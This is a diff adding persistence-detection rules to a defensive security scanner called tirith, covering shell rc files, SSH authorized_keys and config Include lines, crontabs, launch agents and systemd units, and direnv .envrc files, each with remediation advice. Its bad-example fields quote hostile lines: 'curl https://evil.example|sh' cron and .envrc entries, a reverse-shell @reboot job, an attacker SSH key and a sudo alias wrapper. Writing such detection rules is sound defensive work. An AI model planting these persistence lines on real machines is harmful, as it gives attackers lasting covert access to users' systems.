@@ -2013,3 +2013,80 @@ examples_good = ["schema migration .sql files under db/migrations/  # structure 
 false_positive_guidance = "Schema-only migration `.sql` files are legitimate. tirith flags on extension alone — review the file; if it carries no data, this is a false positive you can ignore."
 remediation = "Move the dump out of the repo and add the pattern to .gitignore. If it was committed, scrub it from history (`git filter-repo`). tirith NEVER moves or deletes files — this is a manual fix."
 mitre_id = "T1552.001"
+
+# ─── Persistence-mechanism state-change rules (M9 ch2) ──────────────────────
+# These fire from `tirith persistence diff|watch` when a watched persistence
+# surface changed relative to a recorded snapshot. They are state-change rules,
+# never engine-pipeline rules.
+
+[[rule]]
+id = "persistence_shell_rc_modified"
+title = "Shell rc / profile file modified"
+category = "persistence"
+severity_rationale = "Medium — shell rc files (`~/.bashrc`, `~/.zshrc`, `~/.profile`, fish / PowerShell profiles) run on every new interactive shell, so they are a classic persistence foothold: a sourced payload, a PATH shim, or a malicious alias survives reboots and re-establishes itself on each login."
+description = "A watched shell rc/profile file's sha256 changed since the recorded `tirith persistence` snapshot. The diff surfaces only the ADDED lines (credential-redacted), never removed lines or full content."
+examples_bad = ["a new `source ~/.cache/agent.sh` line appended to ~/.zshrc", "an `alias sudo='sudo evil-wrapper'` added to ~/.bashrc"]
+examples_good = ["adding a personal alias or PATH export you made yourself — re-snapshot with `tirith persistence scan` to accept it as the new baseline"]
+false_positive_guidance = "Any rc edit you made intentionally (a new alias, a tool's installer appending a PATH line) trips this. Review the added lines; if expected, re-baseline. The rule reports change, not maliciousness."
+remediation = "Review the added lines shown by `tirith persistence diff`. If unexpected, remove them and investigate how they got there. If intended, re-run `tirith persistence scan` to record a fresh snapshot."
+mitre_id = "T1546.004"
+
+[[rule]]
+id = "persistence_authorized_keys_new_entry"
+title = "New entry added to ~/.ssh/authorized_keys"
+category = "persistence"
+severity_rationale = "High — a line added to `~/.ssh/authorized_keys` is a direct, password-less remote-access backdoor: whoever holds the matching private key can log in as you. This is one of the most common SSH persistence techniques."
+description = "`~/.ssh/authorized_keys` gained one or more lines since the recorded snapshot. The diff surfaces the added key line(s) (credential-redacted)."
+examples_bad = ["an `ssh-rsa AAAA… attacker@host` line appended to ~/.ssh/authorized_keys"]
+examples_good = ["a new key you added for a laptop or CI runner you control — re-snapshot to accept it"]
+false_positive_guidance = "Adding your own new key (new laptop, CI deploy key) trips this. Confirm you recognize the key comment / fingerprint; if so, re-baseline with `tirith persistence scan`."
+remediation = "If the added key is unrecognized, remove the line from `~/.ssh/authorized_keys` immediately and rotate credentials — an attacker may have shell access. If you added it, re-snapshot to record the new baseline."
+mitre_id = "T1098.004"
+
+[[rule]]
+id = "persistence_crontab_modified"
+title = "User crontab modified"
+category = "persistence"
+severity_rationale = "Medium — cron schedules code to run unattended on an interval, making it a durable persistence and re-infection channel. A `* * * * * curl …|sh` line re-downloads and re-runs a payload every minute."
+description = "The output of `crontab -l` changed since the recorded snapshot. Absence of a crontab is treated as empty, not a change. The diff surfaces added cron lines (credential-redacted)."
+examples_bad = ["a `* * * * * curl https://evil.example|sh` entry added to the crontab", "a reverse-shell `@reboot` line added"]
+examples_good = ["a backup or maintenance job you scheduled yourself — re-snapshot to accept it"]
+false_positive_guidance = "Any cron job you added intentionally trips this. Review the added lines; if you scheduled them, re-baseline with `tirith persistence scan`."
+remediation = "Review added cron entries with `tirith persistence diff`. Remove unrecognized jobs with `crontab -e` and investigate. If intended, re-snapshot to record the new baseline."
+mitre_id = "T1053.003"
+
+[[rule]]
+id = "persistence_launch_agent_added"
+title = "Launch agent / systemd-user unit added"
+category = "persistence"
+severity_rationale = "High — a new `~/Library/LaunchAgents/*.plist` (macOS) or `~/.config/systemd/user/*.service` (Linux) runs code at login or on a schedule under your account. Adding a unit is a high-confidence persistence signal."
+description = "A launchd plist or systemd-user unit file appeared (or its content changed) since the recorded snapshot. Units are tracked by content hash; the diff surfaces added lines for text units (credential-redacted)."
+examples_bad = ["a new com.attacker.agent.plist dropped in ~/Library/LaunchAgents", "a new evil.service unit in ~/.config/systemd/user"]
+examples_good = ["an app installer that legitimately registers a login agent (e.g. a backup tool) — re-snapshot to accept it"]
+false_positive_guidance = "Legitimate app installers register login agents. Review the unit's program/label; if you recognize the app, re-baseline with `tirith persistence scan`."
+remediation = "Inspect the new unit file. If unrecognized, unload it (`launchctl unload <plist>` / `systemctl --user disable --now <unit>`) and remove it. If legitimate, re-snapshot to record the new baseline."
+mitre_id = "T1543.001"
+
+[[rule]]
+id = "persistence_ssh_config_include"
+title = "Include directive added to ~/.ssh/config"
+category = "persistence"
+severity_rationale = "Medium — an `Include` directive added to `~/.ssh/config` pulls in another config fragment whose `ProxyCommand` / `LocalCommand` / host overrides execute or redirect your SSH sessions. An attacker-controlled include is a stealthy session-hijack and persistence vector."
+description = "`~/.ssh/config` gained an `Include` directive that was not present in the recorded snapshot. Only an ADDED `Include` line fires this rule — an unrelated `Host`/option edit does not. The diff surfaces the added line."
+examples_bad = ["`Include /tmp/attacker_config` added to ~/.ssh/config", "`Include ~/.ssh/.hidden/extra` pointing at an attacker-writable fragment"]
+examples_good = ["`Include ~/.ssh/config.d/*` you added to organize your own config — re-snapshot to accept it"]
+false_positive_guidance = "Adding your own `Include` to split a large config trips this. Confirm the include target is one you control and is not world-writable; if so, re-baseline with `tirith persistence scan`."
+remediation = "Review the added `Include` and its target file. If unexpected, remove the directive and inspect the included fragment for malicious `ProxyCommand`/`LocalCommand`. If intended, re-snapshot."
+mitre_id = "T1546"
+
+[[rule]]
+id = "persistence_direnv_new_envrc"
+title = "New .envrc (direnv) appeared in the directory tree"
+category = "persistence"
+severity_rationale = "Medium — direnv auto-sources `.envrc` on `cd` into a directory, so a new `.envrc` in your project ancestry is auto-executed shell code. An attacker who can write a `.envrc` into a directory you enter gets code execution the moment you `cd` there."
+description = "A `.envrc` file appeared in the current working directory's ancestry (or its content changed) since the recorded snapshot. The diff surfaces added lines (credential-redacted)."
+examples_bad = ["a `.envrc` containing `curl https://evil.example|sh` dropped into a repo you clone", "a `.envrc` exporting a malicious PATH override in a parent directory"]
+examples_good = ["a `.envrc` you wrote to set project env vars (`use node`, `export AWS_PROFILE=dev`) — run `direnv allow` and re-snapshot to accept it"]
+false_positive_guidance = "Any `.envrc` you authored for a project trips this on first sight. direnv already requires `direnv allow`; once you trust it, re-baseline with `tirith persistence scan`."
+remediation = "Inspect the `.envrc` shown by `tirith persistence diff` BEFORE running `direnv allow`. If unrecognized, do not allow it and remove the file. If intended, re-snapshot to record the new baseline."
+mitre_id = "T1546"
